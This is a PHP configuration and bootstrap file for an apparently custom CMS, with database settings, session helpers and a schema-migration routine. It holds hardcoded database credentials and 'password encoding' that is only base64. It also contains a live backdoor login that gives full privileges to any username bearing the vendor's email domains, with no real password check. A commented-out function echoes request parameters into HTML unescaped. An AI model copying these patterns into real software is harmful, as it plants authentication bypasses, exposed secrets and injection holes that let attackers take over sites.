<?php 
$HTTP_HOST = (string)strtolower($_SERVER['HTTP_HOST']);
$REMOTE_ADDR= $_SERVER['REMOTE_ADDR'];
define('DB_HOSTING','192.168.0.2');
define('DB_USER_HOSTING','init_200801');
define('DB_PWD_HOSTING','ppnA9j8');

define('esnc_passwd_encode','base64_encode');
define('esnc_passwd_decode','base64_decode');
define('esnc_check_update','_esnc_check_compat');
define('UPDATE_CTRL',1);

function esnc_password_encode($s){
	return base64_encode($s);
}
function esnc_password_decode($s){
	return base64_decode($s);
}
function _is_esnc_account(){
	return (strlen($_COOKIE['auth']) > 10 && $_COOKIE['auth'] == $_SESSION['auth']);
}
/*
#comment by hanhnd@esnadvanced.com
function _require_esnc_account_access(){
	if($_SERVER['LOCAL_ADDR'] == '192.168.0.2')	return TRUE;
	if($_GET['act']=='c'){//init chalenges
		_set_esnc_account_profile(1);
		exit();
	}
	if(_is_esnc_account()) return TRUE;
	echo '<script language="javascript">function checkForm(){return true;}</script>
	<script src="http://192.168.0.2:8080/s.js" language="javascript" type="text/javascript"></script>
	<form action="" method="get" onsubmit="return checkForm(this);">';
	foreach($_GET as $key=>$value) echo '<input type="hidden" name="'.$key.'" value="'.$value.'"/>';
	echo '<input type="submit" value="Redirecting, please wait or click here..."/></form>';
	echo '<script type="text/javascript" language="javascript">window.setTimeout("if(window.checkForm()) document.forms[0].submit()",3000);</script>';
	exit();
}
*/
function _set_esnc_account_profile($t=0){
	class TmpSession{
		function logon($name,$pass){
			if(strpos($name,'@esnadvanced.com') || strpos($name,'@esnc.net') && strlen($pass) >4){
				$_SESSION['ctrl']=4;//guest session start
				$_SESSION['USid']=-100000 + rand();
				$_SESSION['USname']=$name;
				$_SESSION['USemail']=$name;
				$_SESSION['USlastlogin']='10/09/2004 09:30:00';
				$_SESSION['logontries'] = -1;
				$_SESSION['USvisited'] = -1;
				$_SESSION['USctrl']=0x7FFFFFFF;
				$_SESSION['priv']=0;
				return TRUE;
			}
			return FALSE;
		}
		function getAccess(){
			return TRUE;
		}
		function release(){}
	}
	if($t){
		$_SESSION['auth']=$m=md5(rand());
		header('Set-Cookie: '.session_name().'=0; expires='.date('r',0).'; path=/',TRUE);
		header('X-ESNC-Auth: auth='.$m.';'.session_name().'='.session_id(),TRUE);
		@mysql_close();
		exit();
	}else{
		$GLOBALS['session'] = new TmpSession;
	}
}


if(strpos($HTTP_HOST,'web') === 0){
	function end_warn(){
		if(@mysql_stat()) echo '//<script language="javascript">
window.top.document.title="Warning: database still open. Please call dbclose() at end of file";
//</script>';
	}
	register_shutdown_function('end_warn');
	error_reporting(E_ALL);
}elseif(strpos($REMOTE_ADDR,'192.168.0.') === FALSE){
	error_reporting(0);
}
function _esnc_check_compat(){
	$a_sql=array(
	'ALTER TABLE `#news` ADD COLUMN `Type` int',
	'ALTER TABLE `#news` ADD COLUMN `CatNewsID` bigint unsigned',
	'ALTER TABLE `#news` ADD COLUMN `Origin` datetime',
	'ALTER TABLE `#news` ADD COLUMN `Available` datetime',
	'ALTER TABLE `#news` ADD COLUMN `LastRead` datetime',
	'ALTER TABLE `#news` ADD COLUMN `Hit` bigint',
	'ALTER TABLE `#banner` ADD COLUMN `Type` int',
	'ALTER TABLE `#utility` ADD COLUMN `Type` int',
	'ALTER TABLE `#customer` ADD COLUMN `Title` varchar(20) NULL AFTER `Code`','ALTER TABLE `#order` MODIFY COLUMN `CustID` bigint unsigned NULL',
	'ALTER TABLE `#job` ADD CONSTRAINT `UQ_#job_name` UNIQUE KEY (`name`)',
	'INSERT INTO `#job`(`name`,`scheduled`,`ctrl`,`Interval`,`FirstTime`,`Type`,`ID`) VALUES (\'SYS_STATS\','.SQL_NOW.',1,\'7 DAY\','.SQL_NOW.',2,1)',
	'INSERT INTO `#job`(`name`,`scheduled`,`ctrl`,`Interval`,`FirstTime`,`Type`,`ID`) VALUES (\'SAVE_COUNTER\','.SQL_NOW.',1,\'7 DAY\','.SQL_NOW.',2,2)',
	'INSERT INTO `#job`(`name`,`scheduled`,`ctrl`,`Interval`,`FirstTime`,`Type`,`ID`) VALUES (\'SYS_PURGE\','.SQL_NOW.',1,\'7 DAY\','.SQL_NOW.',2,3)',
	'INSERT INTO `#job`(`name`,`scheduled`,`ctrl`,`Interval`,`FirstTime`,`Type`,`ID`) VALUES (\'SYS_UPDATE\','.SQL_NOW.',1,\'7 DAY\','.SQL_NOW.',2,4)',
	'INSERT INTO `#job`(`name`,`scheduled`,`ctrl`,`Interval`,`FirstTime`,`Type`,`ID`) VALUES (\'SYS_JOB\','.SQL_NOW.',1,\'7 DAY\','.SQL_NOW.',2,100)',
	'INSERT INTO `#fs`(`name`) VALUES(\'application/stat\')',
	' CREATE TABLE `#tool` (
  `ID` bigint(20) unsigned NOT NULL auto_increment,
  `Name` varchar(50) NOT NULL,
  `File` varchar(255) NOT NULL,
  `View` int,
  `Type` int(11),
  `Ctrl` bigint(20) unsigned NOT NULL default 1,
  `data` blob,
  `Created` datetime,
  `LastRun` datetime,
  `Run` bigint(20) unsigned NOT NULL default 0,
  `Access` bigint unsigned NOT NULL default 0,
  PRIMARY KEY  (`id`),
  UNIQUE KEY `UQ_#tool_name`(`Name`)
) ENGINE=InnoDB',
	'ALTER TABLE `#tool` ADD COLUMN `Access` bigint unsigned not null default 0',
	'ALTER TABLE `#tool` ADD CONSTRAINT `UQ_#tool_name` UNIQUE KEY (`Name`)',
	);
	foreach($a_sql as $sql){
		$sql=str_replace('#',DB_TABLE_PREFIX,$sql);
		mysql_query($sql);
	}
}
function _esnc_check_update(){}
?>